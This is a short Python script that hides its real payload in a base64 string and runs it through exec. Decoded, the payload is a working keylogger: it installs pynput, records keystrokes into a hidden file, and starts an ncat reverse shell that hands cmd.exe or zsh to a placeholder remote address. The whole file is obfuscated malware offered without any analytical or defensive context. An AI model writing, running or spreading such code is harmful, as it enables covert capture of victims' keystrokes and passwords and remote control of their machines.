import base64

kingen = "aW1wb3J0IG9zCmltcG9ydCBjdHlwZXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgdGhyZWFkaW5nCiMgQ2hlY2sgaWYgdGhlIGBweW5wdXRgIHBhY2thZ2UgaXMgaW5zdGFsbGVkCnN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICctbScsICdwaXAnLCAnaW5zdGFsbCcsICdweW5wdXQnXSkKc3VicHJvY2Vzcy5jaGVja19jYWxsKFtzeXMuZXhlY3V0YWJsZSwgJy1tJywgJ3BpcCcsICdpbnN0YWxsJywgJ25tYXAnXSkKZnJvbSBweW5wdXQua2V5Ym9hcmQgaW1wb3J0IEtleSwgTGlzdGVuZXIKCgojIEhpZGRlbiBmaWxlIGF0dHJpYnV0ZQpGSUxFX0FUVFJJQlVURV9ISURERU4gPSAweDAyCgojIFRhbmcgcHJlc3MgY291bnRlcgpjb3VudCA9IDAKCiMgTGlzdCB0byBzdG9yZSB0aGUgcHJlc3NlZCB0YW5nCnRhbmdzID0gW10KCiMgQ2FsbGJhY2sgZnVuY3Rpb24gdG8gaGFuZGxlIHRhbmcgcHJlc3MgZXZlbnRzCmRlZiBvbl9wcmVzcyh0YW5nKToKICAgIGdsb2JhbCB0YW5ncywgY291bnQKCiAgICB0YW5ncy5hcHBlbmQodGFuZykKICAgIGNvdW50ICs9IDEKCiAgICAjIFByaW50IHRoZSBwcmVzc2VkIHRhbmcgKG9wdGlvbmFsKQogICAgcHJpbnQoInswfSBwcmVzc2VkIi5mb3JtYXQodGFuZykpCgogICAgIyBJZiB0aGUgbnVtYmVyIG9mIHByZXNzZXMgcmVhY2hlcyAxMCwgd3JpdGUgdGhlIHRhbmdzIHRvIGZpbGUKICAgIGlmIGNvdW50ID49IDEwOgogICAgICAgIGNvdW50ID0gMAogICAgICAgIHdyaXRlX2ZpbGUodGFuZ3MpCiAgICAgICAgdGFuZ3MgPSBbXQoKIyBDYWxsYmFjayBmdW5jdGlvbiB0byBoYW5kbGUgdGFuZyByZWxlYXNlIGV2ZW50cwpkZWYgb25fcmVsZWFzZSh0YW5nKToKICAgIGlmIHRhbmcgPT0gS2V5LmVzYzoKICAgICAgICByZXR1cm4gRmFsc2UKCiMgV3JpdGUgdGhlIHByZXNzZWQgdGFuZ3MgdG8gZmlsZQpkZWYgd3JpdGVfZmlsZSh0YW5ncyk6CiAgICAiIiIKICAgIENyb3NzLXBsYXRmb3JtIGhpZGRlbiBmaWxlIHdyaXRlci4KICAgICIiIgogICAgIyBGb3IgKm5peCBzeXN0ZW1zLCBhZGQgYSAnLicgcHJlZml4IHRvIHRoZSBmaWxlIG5hbWUKICAgIHByZWZpeCA9ICcuJyBpZiBvcy5uYW1lICE9ICdudCcgZWxzZSAnJwogICAgZmlsZV9uYW1lID0gcHJlZml4ICsgJ3Rqby50eHQnCgogICAgIyBPcGVuIHRoZSBmaWxlIGluIGFwcGVuZCBtb2RlIGFuZCB3cml0ZSB0aGUgdGFuZ3MKICAgIHdpdGggb3BlbihmaWxlX25hbWUsICdhJykgYXMgZmlsZToKICAgICAgICBmb3IgdGFuZyBpbiB0YW5nczoKICAgICAgICAgICAgdGFuZyA9IHN0cih0YW5nKS5yZXBsYWNlKCInIiwiIikKICAgICAgICAgICAgIyBJZiB0aGUgdGFuZyBpcyBzcGFjZSBvciBlbnRlciwgd3JpdGUgYSBuZXdsaW5lIGNoYXJhY3RlcgogICAgICAgICAgICBpZiAnc3BhY2UnIGluIHRhbmcgb3IgJ2VudGVyJyBpbiB0YW5nOgogICAgICAgICAgICAgICAgZmlsZS53cml0ZSgnXG4nKQogICAgICAgICAgICAjIElmIHRoZSB0YW5nIGlzIG5vdCByZWNvZ25pemVkLCB3cml0ZSBpdHMgdmFsdWUgYXMgaXMKICAgICAgICAgICAgZWxpZiAnS2V5JyBub3QgaW4gdGFuZzoKICAgICAgICAgICAgICAgIGZpbGUud3JpdGUodGFuZykKCiAgICAjIEZvciBXaW5kb3dzIHN5c3RlbXMsIHNldCB0aGUgZmlsZSBhcyBoaWRkZW4KICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICByZXQgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldEZpbGVBdHRyaWJ1dGVzVyhmaWxlX25hbWUsIEZJTEVfQVRUUklCVVRFX0hJRERFTikKICAgICAgICBpZiBub3QgcmV0OgogICAgICAgICAgICByYWlzZSBjdHlwZXMuV2luRXJyb3IoKQogICAgICAgIAogICAgICAgIAojIEZ1bmN0aW9uIHRvIHJ1biB0aGUgbmNhdCBjb21tYW5kCmRlZiBydW5fbmNhdCgpOgogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIG9zLnN5c3RlbSgnInN0YXJ0IC9iIGNtZC5leGUgQGNtZCAvYyAiY21kIC9rICJuY2F0IDxpcD4gPHBvcnQ+IC1lIGNtZC5leGUiIicpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgiIiJvc2FzY3JpcHQgLWUgJ3RlbGwgYXBwbGljYXRpb24gIlRlcm1pbmFsIiB0byBkbyBzY3JpcHQgIm5jYXQgPGlwPiA8cG9ydD4gLWUgL2Jpbi96c2giJyIiIikKCiMgU3RhcnQgdGhlIHRhbmcgbGlzdGVuZXIgaW4gYSBzZXBhcmF0ZSB0aHJlYWQKdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cnVuX25jYXQpCnRocmVhZC5zdGFydCgpCgp3aXRoIExpc3RlbmVyKG9uX3ByZXNzPW9uX3ByZXNzLCBvbl9yZWxlYXNlPW9uX3JlbGVhc2UpIGFzIGxpc3RlbmVyOgogICAgbGlzdGVuZXIuam9pbigp"

exec(base64.b64decode(kingen))